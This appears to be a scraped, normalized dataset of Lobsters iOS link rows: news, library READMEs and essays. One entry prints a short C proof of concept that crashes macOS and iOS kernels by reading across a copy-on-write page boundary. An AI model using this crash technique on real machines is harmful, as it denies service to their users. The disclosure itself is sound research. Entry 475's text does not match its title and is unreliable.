controller let sectionindex selfaccordioncontroller sectionindexforviewcontroller self section open close otherwise open selfaccordioncontroller opensectionindex sectionindex selfaccordioncontroller closesectionatindex sectionindex animated true else selfaccordioncontroller opensectionatindex sectionindex animated true todo note limitation highlight state header view example embedding uitableviewcontroller section undesired effect cell first time section open avoid call selfviewlayoutifneeded viewdidload method section view controller currently alaccordion display limited number section closed state must exceed height device future plan allow scrollable header feel free send pull request license alaccordion available mit license see license file info alliants limited github http githubcomalliants website http alliantscom twitter alliants http twittercomalliants
463,Lobsters,ios,Apple iOS,Four Ways to Quickly Test Swift Code,http://developer.telerik.com/featured/four-ways-to-quickly-test-swift-code/,four way quickly test swift code,telerik ui io discontinued uwp xamarin kendo ui angular kendo ui react mean customer documentation resource telerik ui xamarin question address,telerik ui io discontinued taking decision easy multiple factor taken consideration time changing mobile development trend native mobile application development become preferred method creating mobile apps io android existing crossplatform framework hardly compete always stood developer productivity believe road productivity paved skill reuse targeting multiple platform single code base deliver truly native application focusing product portfolio enhance productivity working popular rising development platform way continue provide best ui productivity tool help developer keep pace latest trend technology staying true calling increasing investment tooling around latest technology developer need includes net related product like uwp xamarin javascript offering kendo ui angular brandnew kendo ui react name mean customer effective immediately new feature product update accompanying documentation resource remain available understand might inconvenience strongly advice try telerik ui xamarin continue building io mobile application question address ready best answer question comment might drop u line reply soon possible
464,Lobsters,ios,Apple iOS,iOS 8.3 Triggers an Avalanche of Improvements,http://tidbits.com/article/15564,io trigger avalanche improvement,massive list bug fix touch id working app store purchase sprint customer bhasker bhat security fix apple tv,apple released io large update bring major new feature offer massive list bug fix performance improvement far update io far download update via setting general software update itunes always good idea wait day see update cause problem far appears io brings performance stability lacking earlier release io however user reporting touch id working app store purchase io forcing enter password manually tidbit experienced problem io icloud photo library officially beta coincide release photo mac soon strongly recommend turning first time completed research final version io o x yosemite photo mac first change might notice io addition new emoji new flag emoji along new one apple watch bulk new symbol expand diversity emoji symbol samesex couple different ethnicity emoji selectable skin tone see tapping emoji selecting preference popover emoji picker also redesigned seamless scrolling addition new emoji might also notice bit speed boost particularly area apple call app launching app responsiveness message wifi control center safari tab thirdparty keyboard keyboard shortcut simplified chinese keyboard release note also boast improved stability phone mail bluetooth photo setting weather genius playlist music noticed significant change iphone however switching keyboard faster scrolling safari tab seems smoother another keyboard tweak appreciate lengthening space bar entering url safari previous version io go button lengthened shortening space bar causing user type period accidentally user google twofactor authentication pleased learn adding google account setting mail contact calendar use twofactor token instead app password io includes wifi bluetooth fix addressing issue like continuously prompted login credential device randomly disconnecting wifi network handsfree call spontaneously disconnecting well issue audio playback could stop working bluetooth speaker sprint customer io allows wifi calling previously exclusive tmobile united state carrier support enable wifi calling setting phone download free apps app store without password visit setting itunes app store password setting free downloads disable require password enter itunes password note password setting menu appear touch id enabled app store purchase setting touch id passcode thanks bhasker bhat solving mystery update fix number orientation quirk including fix stuck orientation fix upsidedown orientation iphone plus issue prevented apps rotating apple also claim orientation rotation performance improved noticed safari seems maintain scroll position changing orientation reader view reliable message see welcome improvement fix group message sometimes split issue prevented message forwarded deleted issue prevented photo preview displaying message io allows filter unknown sender setting message enabled disables notification sender contact split message two list contact sm unknown sender also instruct siri place call via speakerphone also improvement family sharing increased reliability ask buy notification fix bug prevented family member downloading free apps fix bug would prevent apps launching updating io includes many tweak list including improvement carplay enterprise connectivity accessibility various miscellaneous fix always io update includes slew security fix apple also released apple tv thirdgeneration apple tv number similar security improvement
466,Lobsters,ios,Apple iOS,ComponentKit: A React-inspired view framework for iOS,https://github.com/facebook/componentkit,componentkit reactinspired view framework io,quick start carthage cartfile opening xcode project carthage open xcode project repo make sure run installation method learn contributing contributing license,componentkit view framework io heavily inspired react take functional declarative approach building ui built power facebook news feed used throughout facebook io app quick start componentkit available install via carthage get started add following cartfile github facebookcomponentkit opening xcode project componentkit dependency need installed via carthage open xcode project repo make sure run carthage checkout carthage nt installed easily install via homebrew brew install carthage ca nt use homebrew carthage provides installation method get started example app open exampleswildeguesswildeguessxcodeproj build run wildeguess target try interested viewing componentkit source code xcode open componentkitxcodeproj learn contributing see contributing file help license componentkit bsdlicensed also provide additional patent grant file example directory licensed separate license specified file documentation licensed
467,Lobsters,ios,Apple iOS,React Native - Now Open-Source,http://facebook.github.io/react-native/,react native opensource,many platform,react primitive render native platform ui meaning app us native platform apis apps many platform one react create platformspecific version component single codebase share code across platform react native one team maintain two platform share common
470,Lobsters,ios,Apple iOS,Shitphone: A Love Story,https://medium.com/matter/shitphone-a-love-story-a44e66434807?source=reading-list,shitphone love story,living evangelizing proud citizen shitphone arrived homogeneity,living happily electronics shitworld long enough begun evangelizing last television hisense pulled storeroom north carolina walmart employee know simple vibrant led tv bad sound stereo built around insignia receiver best buy house label power speaker company called micca customer review star pretty good router made tplink customer review star keep online reliably netgear bought mother neat little baytek bluetooth speaker customer review star love even programmed voice draw es connected successsfully way suggests strictly mechanical familiarity english impulsebuy offbrand earbuds mixed result derive great satisfaction discovering good one bought used macbook work use chromebook whenever possible aspirational shittop consider situation failure mainstream laptop far enough along commoditization process purpose browsing emailing chatting dealing photo neartotality computer usage almost anything available topselling laptop amazon asus run window would suit need nicely see happens mac diesoffbrand electronics like branded counterpart interesting limited amount time highestend branded version product offer chance taste luxurious future technology shitworld version let preview practical future future global electronicsbuying public actually enjoy take jambox small dazzlingly expensive prism speaker battery wireless radio play music nearly phone respectable volume sensation year introduction offbrand speaker making major inroad online allowing shopper like feel like somehow gaming system requires course narrow convenient definition system year amazon america primary portal consumer electronics shitworld recently one proud citizen released version jambox concept pointedly dull name amazonbasics portable bluetooth speaker customer review star soon basic picnicready wireless speaker may become undistinguished disposable part many consumer lifestyle like usb stick battery point branded version minority sustained consumer looking bluetooth speaker signify luxury style taste offbrand electronics alluring feel like deal long popular branded alternative imply overpriced interesting word long make buyer feel smartone lesserappreciated joy online shopping process streamlining compressing expression capitalism call retail give u god eye view market pattern one search amazon newegg see category past present near future highmargin luxury option one side lowmargin outofdate goodenough option unlikely unknown brand big mushy middle brand fighting diminishing opportunity faintly empowering watch compressed cycle modern consumer electronics pas viewfinder give calming order industry depends perception perpetually exceptional perspective also help enforce realism relationship consumer electronics whether choose luxury option commodity option something buying future garbageit feel little early shitphone offbrand electronics easier conceive legokit assembly part offbrand tv confusing menu system slow remote huge deal tv watching passive job show picture smartphone job connect hundred people dozen internet service smartphone extremely expensive extremely small extremely complex machine interactive object must receive command ably provides information relationship must sustain hundred expectant touch day must miserablethe arrival acceptable shitphones would represent final commoditization entire era consumer electronics laptop flipphones wearable implant redacted return consumption sector thank last warning shitphone arrived time delivered doorstep temporary rental home quietly dog notice appeared final invisible link labor chain stretching back blu product anonymous rectangular structure industrial suburb miami back factory special economic zone china side box sort manifest handset battery charger etc back box basic aside mysterious marking seal anatel example brazil version fcc packaging serviceable even helpful like nutritional information advertising neatly packed around thick light shiny phone headphone case screen protector installed sim slotted sd card activated phone installed apps screen fine software android aka jelly bean new abandoned camera took picture internet connected mostly charged beganthe first day shitphone one long sigh relief everything worked least seemed work app needed download chatted groupme checked instagram took picture texted made call went run listened music streamed internet dictated direction google map got supposed go typing little slow gmail would pause moment proof concept shitphone performing better expected tenth price iphone begun resent getting nearly functionality end day active one charge left nice nice nice set alarm next morning woke uphomogeneity expect shitphones get buy blu unnecto posh mobile prestigio yezz infocus irulu expect similar box part sorted price point gut likely lowtomidrange hardware mediatek mostly invisible u market second largest supplier mobile phone systemsonchip world mean phone share specification quirky feature even cheapest phone let use two sim card example many fm radio shell must fit around mediatek core technology stick basic style bigger phone seamless rectangle particular thickness small one roundback thickbezel handset evoke iphone cheaper phone get android dollar android case major brand shitphones latest version android becoming availablepremium branded phone culmination decade research wireless technology computing material design shitphones culmination decade research wireless technology computing material design minus year two shitphones generally actually shitty isolate distorting effect highly competitive preferencedriven smartphone retail marketing absence help keep cheap marvel engineering execution assembled precision care able accomplish task halfdozen year ago would inconceivable portable device iphones really shitphones futurethis commoditization feel like genuine novelty rapidly reduced thankless anonymity iphone highend competitor benefited year visible functional instance profoundly globally novel new product one pioneering brand beginning new technological era sell someone first magical hand device apply temporary multiplier everything brand recognition loyalty profit brand temporary protective spell cast inevitable approach anniversary release iphone category blew starting feel familiar american purchased smartphone contract bought discarded least three device smartphones mature reality use improve disappear little emailing instagramming facebooking snapchatting whatsapping angrybirdsing anyway
471,Lobsters,ios,Apple iOS,An interactive Comparison Chart of the 300 most popular Tablets,http://www.productchart.com/tablets/,interactive comparison chart popular tablet,amazon fire kid detail dragon touch detail zonko detail dragon touch detail jumper ezpad pro detail vankyo matrixpad detail dragon touch detail dragon touch pro detail dragon touch detail zonko detail vankyo matrixpad detail hoozo detail topelotek detail vankyo matrixpad detail vankyo matrixpad detail microsoft surface go detail vankyo matrixpad detail vankyo matrixpad detail samsung galaxy tab lite detail contixo detail veidoo detail vankyo matrixpad detail vatenick detail samsung galaxy tab detail microsoft surface detail detail pritom detail winsing detail chuwi x detail rca viking pro detail detail lectrus detail samsung galaxy tab detail microsoft surface go detail meberry detail rca atlas pro detail chuwi ubook detail jinheng detail lenovo tab detail dragon touch detail nuvision encite split detail simbans tangotab detail detail dragon touch notepad detail vankyo matrixpad detail aoyodkg detail microsoft surface pro detail samsung galaxy tab detail microsoft surface pro x detail dragon touch detail vucatimes detail apple ipad mini detail yisence detail apple ipad pro detail microsoft surface book detail rca galileo pro detail detail samsung galaxy tab detail hoozo detail hoozo detail asiur detail winnovo detail apple ipad mini detail ujoyfeel detail flyingtech detail surfans detail lenovo smart tab detail lenovo tab detail forentek detail prograce detail ujoyfeel detail lenovo tab detail microsoft surface go detail winsing detail microsoft surface book detail chenen detail nxy detail samsung galaxy tab detail rca voyager detail remarkable detail microsoft surface pro detail yellyouth detail microsoft surface pro x detail lenovo tab detail samsung galaxy tab detail samsung galaxy tab e lite detail microsoft surface pro detail asus zenpad detail samsung galaxy tab detail samsung galaxy tab detail yellyouth detail lectrus detail lenovo tab detail samsung galaxy tab e detail forentek detail samsung galaxy tab detail samsung galaxy tab detail samsung galaxy tabpro detail lectrus detail samsung galaxy tab detail victbing detail sumtab pro detail yisence detail microsoft surface detail victbing detail lenovo yoga book detail rca voyager pro detail azpen detail microsoft surface pro detail lenovo tab detail microsoft surface pro detail google pixel slate detail lenovo smart tab detail apple ipad air detail lenovo tab plus detail manjee detail detail yellyouth detail detail samsung galaxy tab detail apple ipad mini detail yuntab detail apple ipad mini detail yitaoera detail microsoft surface pro x detail samsung galaxy view detail microsoft surface detail lenovo yoga tab detail victbing detail microsoft surface pro detail dragon touch plus detail microsoft surface pro x detail microsoft surface pro detail contixo detail apple ipad pro detail lenovo yoga tab pro detail apple ipad pro detail samsung galaxy tab detail winsing detail microsoft surface pro detail beyondtab detail apple ipad air detail asus zenpad detail microsoft surface pro detail lenovo thinkpad detail detail,amazon fire kid price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce zonko price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce jumper ezpad pro price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch pro price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce zonko price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce hoozo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce topelotek price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface go price aug pst detail screen inch pixel x storage gb ram gb weight ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab lite price aug pst detail screen inch pixel x storage gb ram gb weight ounce contixo price aug pst detail screen inch pixel x storage gb ram gb weight ounce veidoo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce vatenick price aug pst detail screen inch pixel unknown x unknown storage gb ram gb weight unknown ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce pritom price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce winsing price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce chuwi x price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca viking pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce lectrus price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface go price aug pst detail screen inch pixel x storage gb ram gb weight ounce meberry price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca atlas pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce chuwi ubook price aug pst detail screen inch pixel x storage gb ram gb weight ounce jinheng price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce nuvision encite split price aug pst detail screen inch pixel x storage gb ram gb weight ounce simbans tangotab price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch notepad price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vankyo matrixpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce aoyodkg price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce vucatimes price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce yisence price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce apple ipad pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface book price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca galileo pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce hoozo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce hoozo price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce asiur price aug pst detail screen inch pixel x storage gb ram gb weight ounce winnovo price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce ujoyfeel price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce flyingtech price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce surfans price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo smart tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce forentek price aug pst detail screen inch pixel x storage gb ram gb weight ounce prograce price aug pst detail screen inch pixel x storage gb ram gb weight ounce ujoyfeel price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface go price aug pst detail screen inch pixel x storage gb ram gb weight ounce winsing price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface book price aug pst detail screen inch pixel x storage gb ram gb weight ounce chenen price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce nxy price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca voyager price aug pst detail screen inch pixel x storage gb ram gb weight ounce remarkable price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce yellyouth price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab e lite price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce asus zenpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce yellyouth price aug pst detail screen inch pixel x storage gb ram gb weight ounce lectrus price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab e price aug pst detail screen inch pixel x storage gb ram gb weight ounce forentek price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tabpro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lectrus price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce victbing price aug pst detail screen inch pixel x storage gb ram gb weight ounce sumtab pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce yisence price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface price aug pst detail screen inch pixel x storage gb ram gb weight ounce victbing price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo yoga book price aug pst detail screen inch pixel x storage gb ram gb weight ounce rca voyager pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce azpen price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce google pixel slate price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo smart tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad air price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo tab plus price aug pst detail screen inch pixel x storage gb ram gb weight ounce manjee price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce yellyouth price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram unknown gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce yuntab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad mini price aug pst detail screen inch pixel x storage gb ram gb weight ounce yitaoera price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy view price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo yoga tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce victbing price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch plus price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce contixo price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo yoga tab pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce winsing price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce beyondtab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad air price aug pst detail screen inch pixel x storage gb ram gb weight ounce asus zenpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo thinkpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce
472,Lobsters,ios,Apple iOS,DIY: kernel panic OS X and iOS in 10 LOC,https://medium.com/@oleavr/diy-kernel-panic-os-x-and-ios-in-10-loc-c250d9649159,diy kernel panic o x io loc,diy kernel panic o x io loc wwwfridare frida update incorporated improvement http,diy kernel panic o x io locafter receiving quite report user wwwfridare kernel panic upon attaching second time process finally got around debugging kernel figure going onfirst little background frida hook function call rewriting function prologue memory order make containing memory page writable patch code later revert shared library mapped copied memory kernel share memory page process memory page copyonwrite local modification simply give process copy memory page question whenever frida intercept function shared library sideeffect occurs upon attaching process frida hook one function user frida may hooking plenty well also every time frida attache process probe portion address space also mean parsing metadata loaded shared library parsing end reading memory pageshaving increasingly frustrated looming kernel panic never finding big enough chunk time investigate properly opportunity finally presented fired bincat guinea pig program one terminal attached frida detached next bincat still running ran vmmap copied output debugger machine next requested frida attach second time kernel panic triggered usual machine waiting debugger attach fired lldb attached quick look callstack revealed hitting failing assertion handling machvmreadoverwrite looking argument clear requested read many byte looking back vmmap output noticed something peculiar asked read first page shared library unlike library page library second page marked prv private cow copyonwrite made perfect sense knew frida hooked one function particular library could bug handling read spanning cow prv page quickly wrote tiny c program test theory yep issue simplifying arrived include unistdh include machmachh include machodyldh ifndef define machvmprotect vmprotect define machvmreadoverwrite vmreadoverwrite endifextern kernreturnt machvmprotect vmmapt machvmaddresst machvmsizet booleant vmprott extern kernreturnt machvmreadoverwrite vmmapt machvmaddresst machvmsizet machvmaddresst machvmsizet intmain int argc char argv volatile char library const machvmsizet pagesize getpagesize const machvmsizet buffersize pagesize char buffer buffersize machvmsizet resultsize library char dyldgetimageheader machvmprotect machtaskself machvmaddresst library pagesize pagesize false vmprotread vmprotwrite vmprotcopy library pagesize cow prv transition library pagesize undo dummymodification resultsize panic machvmreadoverwrite machtaskself machvmaddresst library buffersize machvmaddresst buffer resultsize return compile run observe instant kernel panic latest o x io update incorporated improvement http frida git workaround limit read one page time part upcoming release released soonnote reported apple february though impression past event likely fix anytime soon
473,Lobsters,ios,Apple iOS,Goby: Develop iOS apps with ClojureScript.,https://github.com/mfikes/goby,goby develop io apps clojurescript,goby overview app usage shrimp shrimp repl shrimp performance project status one production app cljsrnorg license,goby develop io apps clojurescript platform io pod goby overview repository contains lightweight clojurescript objectivec glue code facilitates creating io apps view controller written clojurescript instead swift otherwise resulting io apps native javascript running embedded javascriptcore instance overall design includes decorator various uikit element implementing jsexport protocol interop established clojurescript code ui element goby treat ui bunch mutable state manipulated listened atom clojurescript code simply holding reference decorator needing provide objectivec protocol implementation uitableviewdatasource goby provides equivalent clojurescript protocol along glue code reify macro making possible implement objectivec protocol directly clojurescript case objectivec method optional handled thing thrown get thing ground like infrastructural glue code manage loading javascript along simple facility method dispatch io clojurescript namespaces clojurescript keywords various io sdk enumeration constant defined make life easier goby fairly minimal simply providing structure help establish communication objectivec clojurescript side fence nt attempt provide sophisticated framework supporting functional programming style least get point coding clojurescript approach used build app currently app store repo derived reusable bit project usage check companion working example project shrimp illustrating actual use code roughly speaking overall step set sibling io clojurescript project make goby io clojurescript code available shrimp project provides working example goby dependency managed via cocoapods clojars clojurescript app compiles javascript included reference io project bundle appdelegate application didfinishlaunchingwithoptions set instance gbymanager load clojurescriptcompiled javascript add callback handler needed logging timer create view using storyboards xcode interface builder usual wire ui element view controller header would normally create glue uiviewcontroller class view extending gbyviewcontroller make view controller call clojurescript view loaded passing decorated reference uikit element clojurescript side create namespace mirror name view controller make use defui macro set atom ui element export method objectivec side use initialize ui element atom course could coded hand example goby code reduce repeated boilerplate view controller add code clojurescript namespace set ui event handler perform application logic needed update ui element etc word implement app logic clojurescript add view view controller segue normally would end application primarily consists set clojurescript namespaces covering various view controller along ancillary applicationlevel clojurescript needed flesh application repl use repl developing inspecting manipulating ui app state revising function implementation etc found need restart io app making storyboard change significant change shrimp project discus establishing repl performance launch time performance good used iphone ipad ipod touch google closure optimized javascript production app loaded around millisecond runtime one area often see performance issue io implementing scrolling table view production app table view driven clojurescript initializing cell using data clojurescript side etc seen stuttering scrolling otherwise arguably using clojurescript orchestrate otherwise native io ui native io animation performance issue going route task using http image fetching rest api call simply make use fine native afnetworking library driving clojurescript project status used goby create one production app app store maintaining goby fleshing aspect goby code needed code incomplete area rough corner others others future apps instead focusing using clojurescript om react native lead much saner architectural style adhering fp principle embracing immutability etc goby created world nt react native longer pushing forward imperative approach used goby learn react native clojurescript see cljsrnorg license copyright mike fikes contributor distributed eclipse public license either version option later version
474,Lobsters,ios,Apple iOS,Send Data to Apple Watch with Core Data and Telerik UI for iOS in Swift,http://blogs.telerik.com/blogs/15-02-03/send-data-to-apple-watch-with-core-data-and-telerik-ui-for-ios-in-swift,send data apple watch core data telerik ui io swift,core data telerik chart io existing iphone app project using telerik chart io creating watchkit app creating data proxy library app group sending getting data using proxy library github,apple watch long rumored device finally appeared september followed watch sdk called watchkit november introduction sdk maybe raised question answered like everybody else looking future answer apple one question send data larger allowed push notification iphone watch well several way nsuserdefaults file core data single recommended approach apple method legit however nsuserdefaults appropriate user preference rather real data file may good solution data scenario therefore choose bet core data today going show send telerik chart io apple watch form image string stored core data common scenario existing iphone app project using telerik chart io want compliment apple watch app tutorial assumes already project called applewatchwithtelerikchart worry check use core data checkbox back created iphone app assume core data enabled initially show enable existing app last least tutorial assumes using swift primary language complete project structure consist iphone app watchkit app framework directly communicates core data use xcode beta let get started creating watchkit app iphone app project opened xcode go file target io apple watch watchkit app click next check include notification scene include glance scene checkboxes may need point future development tutorial focus main watchkit app product name field filled automatically click finish asked whether activate applewatchwithtelerikchart watchkit app scheme click activate open interfacestoryboard applewatchwithtelerikchart watchkit app folder add image label component interface controller scene using ctrldrag create iboutlets name chartimageview titlelabel creating data proxy library iphone app project opened xcode go file target io framework library cocoa touch framework click next name library watchcoredataproxy select swift language dropdown click finish rightclick watchcoredataproxy folder project structure panel select new file io core data data model name model watchmodel click create create model file open model editor create new entity called chartdataentity add two field entity imagebinarydata type binary data stringdata type string time implement code needed talk sqlite db behind core data core logic implementation boilerplate code get appdelegateswift file create project clicking use core data checkbox basically core logic consists applicationdocumentsdirectory managedobjectmodel persistentstorecoordinator managedobjectcontext property savecontext method let add watchcoredataproxyswift following way rightclick watchcoredataproxy folder new file io source swift file create new swift file name file watchcoredataproxy add following code next method implement watchcoredataproxy class send data image text iphone app sqlite db core data method fetch saved data expose watchkit app app group iphone app proxy library watchkit app time make sure iphone app watchkit app actually share data thing enables sharing data whatever form application file nsuserdefaults coredata called app group application part app group enable app group feature apps select applewatchwithtelerikchart project project structure panel select applewatchwithtelerikchart app target go capability app group turn feature asked select development teamaccount check groupwatchsample group course create group name demo purpose use default one select applewatchwithtelerikchart watchkit extension target go capability app group turn feature check groupwatchsample group important name group name applewatchwithtelerikchart app group sending getting data using proxy library coredata proxy app group enabled overall project structure built let send data iphone core data apple watch send image chart string take screenshot chart following way assuming tkchart instance called chart import watchcoredataproxy set sharedappgroup property core data proxy name app group send image string sqlite db iphone app side let get data sqlite db set image label object watch import watchcoredataproxy set sharedappgroup core data proxy app group name get image string sqlite thought core data proxy set image string chartimageview titlelabel one way send data iphone apple watch looking forward seeing apple introduce another api data transfer device time come use approach complete swift project following step found github happy coding
475,Lobsters,ios,Apple iOS,Learn How to Code With Online Resources ‚Äì Free and Paid,http://webdesignpool.com/learn-programming-online,learn code online resource free paid,drive rideshare company uber lyft buy sell get return investment amazon post gig fiverr fiverr help business owner social medium seo cape town teach english nonnative speaker become pet sitterdog walker donate plasma,looking make extra cash without getting second job want make money without commitment probably looking flexible side hustle would work around schedule lot fun easy way earn money side even currently fulltime job check following seven unique side hustle worth try drive rideshare company working vehicle license could always work rideshare company uber lyft set schedule work often want may want spend weekend driving company people taking ride get want go however entirely neither rideshare company service expects driver work set time always option driving picking people many hour would like even car always use bicycle provide service ubereats doordash postmates working company would go restaurant grab food order deliver order directly customer great solution without vehicle would still like earn extra money buy sell get return investment know make decent money purchasing item clearance thrift store reselling need go local store walmart target look item clearance section also check thrift store area see find grabbing great item reasonable rate post online amazon ebay sell higher price get return investment post gig fiverr fiverr site allows post kind service offer individual example might large social medium following would willing post link video business owner get word product sell offer social medium promotion web design ebook formatting earn quick cash convenience help business owner social medium good social medium know naturally bring lot follower use skill help business owner many business owner time patience use social medium want work strengthening online presence offer provide social medium service help business owner get follower customer another variation help customer seo cape town get ranking key search term business need teach english nonnative speaker would like teach english people country several apps allow individual united state work remotely teaching child adult english different lesson plan set schedule work hour want making new friend around world become pet sitterdog walker love animal offer become pet sitter dog walker side becoming dog walker great get exercise spend time outdoors earning extra money offer watch pet people going away vacation business trip donate plasma one relaxing way earn extra cash donate plasma average person donate plasma twice week potentially earning week month painful take long complete donation process paid spot wait around cash need hundred extra dollar per month great side hustle want earn extra money best way fact participate several side hustle earn much want
